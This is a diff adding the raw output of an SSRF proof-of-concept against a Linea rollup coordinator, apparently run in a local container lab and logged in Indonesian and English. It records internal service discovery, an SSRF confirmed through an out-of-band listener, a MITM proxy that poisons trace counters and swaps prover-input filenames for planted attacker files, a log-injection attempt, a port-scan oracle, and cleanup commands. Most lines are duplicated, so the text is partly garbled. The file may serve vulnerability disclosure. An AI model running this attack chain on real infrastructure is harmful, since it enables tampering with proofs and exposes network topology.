@@ -1,0 +1,262 @@
+==================================================================
+  LINEA COORDINATOR SSRF - FINAL PoC (fully dynamic)
+  Phase: Discover -> SSRF -> Poison -> Prover Input -> Log Forge
+==================================================================
+==================================================================
+  LINEA COORDINATOR SSRF - FINAL PoC (fully dynamic)
+  Phase: Discover -> SSRF -> Poison -> Prover Input -> Log Forge
+==================================================================
+Timestamp: 2026-09-06T15:28:43Z
+
+=============== PHASE 0: ENVIRONMENT DISCOVERY ===============
+Timestamp: 2026-09-06T15:28:43Z
+
+=============== PHASE 0: ENVIRONMENT DISCOVERY ===============
+[+] Coordinator container : coordinator
+[+] Coordinator container : coordinator
+9546
+9546
+[+] Coordinator RPC       : http://10.10.10.106:9546/
+[+] Gateway IP (OOB host) : 10.10.10.1
+[+] Coordinator RPC       : http://10.10.10.106:9546/
+[+] Gateway IP (OOB host) : 10.10.10.1
+[*] Mencari Sequencer (eth_blockNumber)...
+[*] Mencari Sequencer (eth_blockNumber)...
+[+] Sequencer IP: 10.10.10.5
+[+] Sequencer IP: 10.10.10.5
+[*] Mencari Traces API (linea_getBlockTracesCountersV2)...
+[*] Mencari Traces API (linea_getBlockTracesCountersV2)...
+[+] Traces/Besu IP: 10.10.10.5
+[*] Mencari Shomei (rollup_getZkEVMStateMerkleProofV0)...
+[+] Traces/Besu IP: 10.10.10.5
+[*] Mencari Shomei (rollup_getZkEVMStateMerkleProofV0)...
+[+] Shomei IP: 11.11.11.107
+[+] Shomei IP: 11.11.11.107
+[+] Host data dir: /workspaces/lineth-monorepo/tmp/local
+[+] Host data dir: /workspaces/lineth-monorepo/tmp/local
+
+[*] Chain head (sequencer):
+
+[*] Chain head (sequencer):
+    Chain head: 182
+    Chain head: 182
+[+] Block range untuk job: 179..180
+[+] Block range untuk job: 179..180
+
+==================================================================
+  DISCOVERY SELESAI - mulai attack chain
+==================================================================
+
+=============== PHASE 1: BASELINE SSRF (OOB) ===============
+
+==================================================================
+  DISCOVERY SELESAI - mulai attack chain
+==================================================================
+
+=============== PHASE 1: BASELINE SSRF (OOB) ===============
+[1.1] Mengirim payload SSRF (tracesApi = OOB server)...
+[1.1] Mengirim payload SSRF (tracesApi = OOB server)...
+    Response: {"jsonrpc":"2.0","id":1,"result":["179-180-2034941608"]}
+[1.2] Menunggu 30 detik...
+    Response: {"jsonrpc":"2.0","id":1,"result":["179-180-2034941608"]}
+[1.2] Menunggu 30 detik...
+    [!!!] SSRF TERKONFIRMASI - request outbound ditangkap:
+    [!!!] SSRF TERKONFIRMASI - request outbound ditangkap:
+      POST / from 10.10.10.106
+        headers={'Content-Type': 'application/json', 'content-length': '97', 'host': '10.10.10.1:12345'}
+        body=b'{"jsonrpc":"2.0","id":1,"method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":179}]}'
+      POST / from 10.10.10.106
+        headers={'Content-Type': 'application/json', 'content-length': '97', 'host': '10.10.10.1:12345'}
+        body=b'{"jsonrpc":"2.0","id":2,"method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":180}]}'
+      POST / from 10.10.10.106
+        headers={'Content-Type': 'application/json', 'content-length': '97', 'host': '10.10.10.1:12345'}
+        body=b'{"jsonrpc":"2.0","id":3,"method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":181}]}'
+      POST / from 10.10.10.106
+        headers={'Content-Type': 'application/json', 'content-length': '97', 'host': '10.10.10.1:12345'}
+        body=b'{"jsonrpc":"2.0","id":1,"method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":179}]}'
+      POST / from 10.10.10.106
+        headers={'Content-Type': 'application/json', 'content-length': '97', 'host': '10.10.10.1:12345'}
+        body=b'{"jsonrpc":"2.0","id":2,"method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":180}]}'
+      POST / from 10.10.10.106
+        headers={'Content-Type': 'application/json', 'content-length': '97', 'host': '10.10.10.1:12345'}
+        body=b'{"jsonrpc":"2.0","id":3,"method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":181}]}'
+
+=============== PHASE 2: DATA POISONING ===============
+
+=============== PHASE 2: DATA POISONING ===============
+[+] MITM aktif (PID 396209, :12346) -> traces=http://10.10.10.5:8545 shomei=http://11.11.11.107:8888
+[+] MITM aktif (PID 396209, :12346) -> traces=http://10.10.10.5:8545 shomei=http://11.11.11.107:8888
+[2.1] Submit POISON-PLUS job (counters +1000, silent)...
+[2.1] Submit POISON-PLUS job (counters +1000, silent)...
+    Response: {"jsonrpc":"2.0","id":1,"result":["179-180-109302646"]}
+    Response: {"jsonrpc":"2.0","id":1,"result":["179-180-109302646"]}
+[2.2] Submit POISON-OVER job (counters=999999999, decision control)...
+[2.2] Submit POISON-OVER job (counters=999999999, decision control)...
+    Response: {"jsonrpc":"2.0","id":1,"result":["179-180--506715652"]}
+    Response: {"jsonrpc":"2.0","id":1,"result":["179-180--506715652"]}
+    JobIDs: PLUS=179-180-109302646 | OVER=179-180--506715652
+[2.3] Submit PROVER-INPUT job (filename tamper)...
+    JobIDs: PLUS=179-180-109302646 | OVER=179-180--506715652
+[2.3] Submit PROVER-INPUT job (filename tamper)...
+    File ditanam: /data/traces/v2/conflated/ATTACKER1788708558.attacker.lt.gz
+    File ditanam: /data/traces/v2/conflated/ATTACKER1788708558.attacker.lt.gz
+    Response: {"jsonrpc":"2.0","id":1,"result":["179-180--270415788"]}
+    Response: {"jsonrpc":"2.0","id":1,"result":["179-180--270415788"]}
+    JobID FILE: 179-180--270415788
+    JobID FILE: 179-180--270415788
+[2.4] Menunggu 120 detik untuk processing...
+[2.4] Menunggu 120 detik untuk processing...
+    ... 10s    ... 10s    ... 20s    ... 20s    ... 30s    ... 30s    ... 40s    ... 40s    ... 50s    ... 50s    ... 60s    ... 60s    ... 70s    ... 70s    ... 80s    ... 80s    ... 90s    ... 90s    ... 100s    ... 100s    ... 110s    ... 110s    ... 120s
+
+=============== PHASE 3: LOG INJECTION ===============
+    ... 120s
+
+=============== PHASE 3: LOG INJECTION ===============
+[3.1] Submit URL dengan newline (log forging)...
+[3.1] Submit URL dengan newline (log forging)...
+    Response: {"jsonrpc":"2.0","error":{"code":-32700,"message":"Parse error"}} (note: Internal error = newline diterima)
+    Response: {"jsonrpc":"2.0","error":{"code":-32700,"message":"Parse error"}} (note: Internal error = newline diterima)
+    [-] Tidak terdeteksi sebagai baris mandiri
+    [-] Tidak terdeteksi sebagai baris mandiri
+
+=============== PHASE 4: PORT SCAN ORACLE ===============
+[4.1] Closed port (connection refused oracle)...
+
+=============== PHASE 4: PORT SCAN ORACLE ===============
+[4.1] Closed port (connection refused oracle)...
+    Response: {"jsonrpc":"2.0","id":1,"error":{"code":-32602,"message":"Invalid request parameters: Failed to parse ConflationCreateProverRequestJsonDto from request params"}}
+    Response: {"jsonrpc":"2.0","id":1,"error":{"code":-32602,"message":"Invalid request parameters: Failed to parse ConflationCreateProverRequestJsonDto from request params"}}
+    [+] ORACLE CONFIRMED: time=2026-09-06T15:31:21,923Z level=WARN message=Request '{"jsonrpc":"2.0","id":2,"method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":170}]}' already retried 186 times. lastError=io.net
+    [+] ORACLE CONFIRMED: time=2026-09-06T15:31:21,923Z level=WARN message=Request '{"jsonrpc":"2.0","id":2,"method":"linea_getBlockTracesCountersV2","params":[{"blockNumber":170}]}' already retried 186 times. lastError=io.net
+
+=============== PHASE 5: EVIDENCE COLLECTION ===============
+(A) MITM LOG (semua request + tamper):
+
+=============== PHASE 5: EVIDENCE COLLECTION ===============
+(A) MITM LOG (semua request + tamper):
+    >> /poison-plus linea_generateConflatedTracesToFileV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-plus linea_generateConflatedTracesToFileV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-plus linea_generateConflatedTracesToFileV2 
+    >> /poison-over linea_generateConflatedTracesToFileV2 
+    >> /poison-plus linea_generateConflatedTracesToFileV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-over linea_generateConflatedTracesToFileV2 
+    >> /poison-over linea_generateConflatedTracesToFileV2 
+    >> /poison-over linea_generateConflatedTracesToFileV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-file linea_generateConflatedTracesToFileV2 TAMPER filename: /data/traces/v2/conflated/34-35.conflated.linea-0f74f55.26.7.0-6580da8.lt.gz -> /data/traces/v2/conflated/ATTACKER1788708558.attacker.lt.gz
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-file linea_generateConflatedTracesToFileV2 TAMPER filename: /data/traces/v2/conflated/169-170.conflated.linea-0f74f55.26.7.0-6580da8.lt.gz -> /data/traces/v2/conflated/ATTACKER1788708558.attacker.lt.gz
+    >> /poison-file linea_generateConflatedTracesToFileV2 TAMPER filename: /data/traces/v2/conflated/108-109.conflated.linea-0f74f55.26.7.0-6580da8.lt.gz -> /data/traces/v2/conflated/ATTACKER1788708558.attacker.lt.gz
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-plus linea_getBlockTracesCountersV2 
+    >> /poison-over linea_getBlockTracesCountersV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-file linea_getBlockTracesCountersV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-plus linea_getBlockTracesCountersV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-plus linea_generateConflatedTracesToFileV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-plus linea_generateConflatedTracesToFileV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-plus linea_generateConflatedTracesToFileV2 
+    >> /poison-over linea_generateConflatedTracesToFileV2 
+    >> /poison-plus linea_generateConflatedTracesToFileV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-over linea_generateConflatedTracesToFileV2 
+    >> /poison-over linea_generateConflatedTracesToFileV2 
+    >> /poison-over linea_generateConflatedTracesToFileV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-file linea_generateConflatedTracesToFileV2 TAMPER filename: /data/traces/v2/conflated/34-35.conflated.linea-0f74f55.26.7.0-6580da8.lt.gz -> /data/traces/v2/conflated/ATTACKER1788708558.attacker.lt.gz
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-file linea_generateConflatedTracesToFileV2 TAMPER filename: /data/traces/v2/conflated/169-170.conflated.linea-0f74f55.26.7.0-6580da8.lt.gz -> /data/traces/v2/conflated/ATTACKER1788708558.attacker.lt.gz
+    >> /poison-file linea_generateConflatedTracesToFileV2 TAMPER filename: /data/traces/v2/conflated/108-109.conflated.linea-0f74f55.26.7.0-6580da8.lt.gz -> /data/traces/v2/conflated/ATTACKER1788708558.attacker.lt.gz
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-plus linea_getBlockTracesCountersV2 
+    >> /poison-over linea_getBlockTracesCountersV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-file linea_getBlockTracesCountersV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> /poison-plus linea_getBlockTracesCountersV2 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+    >> / rollup_getZkEVMStateMerkleProofV0 
+
+(B) LOG COORDINATOR - Poisoned counters di 'new batch':
+
+(B) LOG COORDINATOR - Poisoned counters di 'new batch':
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+    trigger=TIME_LIMIT tracesCounters=TracesCountersV5(countersMap={ADD=0, BLAKE_MODEXP_DATA=1, BLOCK_DATA=28, BLOCK_HASH=18, BLS_DATA=15, EC_DATA=7
+
+(C) File request job PROVER-INPUT:
+
+(C) File request job PROVER-INPUT:
+
+(D) Traces files di shared FS:
+
+(D) Traces files di shared FS:
+    -rw-r--r--  1 root      root       139902 Sep  6 15:16 99-99.conflated.linea-0f74f55.26.7.0-6580da8.lt.gz
+    -rw-rw-rw-  1 codespace codespace      47 Sep  6 15:07 ATTACKER1788707248.attacker.lt.gz
+    -rw-rw-rw-  1 codespace codespace      47 Sep  6 15:18 ATTACKER1788707919.attacker.lt.gz
+    -rw-rw-rw-  1 codespace codespace      47 Sep  6 15:27 ATTACKER1788708466.attacker.lt.gz
+    -rw-rw-rw-  1 codespace codespace      47 Sep  6 15:29 ATTACKER1788708558.attacker.lt.gz
+    -rw-r--r--  1 root      root       139902 Sep  6 15:16 99-99.conflated.linea-0f74f55.26.7.0-6580da8.lt.gz
+    -rw-rw-rw-  1 codespace codespace      47 Sep  6 15:07 ATTACKER1788707248.attacker.lt.gz
+    -rw-rw-rw-  1 codespace codespace      47 Sep  6 15:18 ATTACKER1788707919.attacker.lt.gz
+    -rw-rw-rw-  1 codespace codespace      47 Sep  6 15:27 ATTACKER1788708466.attacker.lt.gz
+    -rw-rw-rw-  1 codespace codespace      47 Sep  6 15:29 ATTACKER1788708558.attacker.lt.gz
+
+(E) Retry/log flooding check:
+
+(E) Retry/log flooding check:
+    Total 'already retried' lines: 1612
+    Total 'already retried' lines: 1612
+
+(F) Config dump evidence (topology leak):
+
+(F) Config dump evidence (topology leak):
+
+=============== CLEANUP ===============
+
+=============== CLEANUP ===============
+[+] Listener dibunuh. Restart coordinator untuk hapus job zombie:
+[+] Listener dibunuh. Restart coordinator untuk hapus job zombie:
+    docker restart coordinator
+    rm -rf /workspaces/lineth-monorepo/tmp/local/conflation-backtesting/*
+
+Evidence tersimpan:
+    - poc_ssrf_final_results.txt (output lengkap run ini)
+    - /tmp/ssrf_mitm_log.txt (MITM log)
+    - /tmp/ssrf_oob_capture.txt (OOB capture)
+
+Selesai.
+    docker restart coordinator
+    rm -rf /workspaces/lineth-monorepo/tmp/local/conflation-backtesting/*
+
+Evidence tersimpan:
+    - poc_ssrf_final_results.txt (output lengkap run ini)
+    - /tmp/ssrf_mitm_log.txt (MITM log)
+    - /tmp/ssrf_oob_capture.txt (OOB capture)
+
+Selesai.
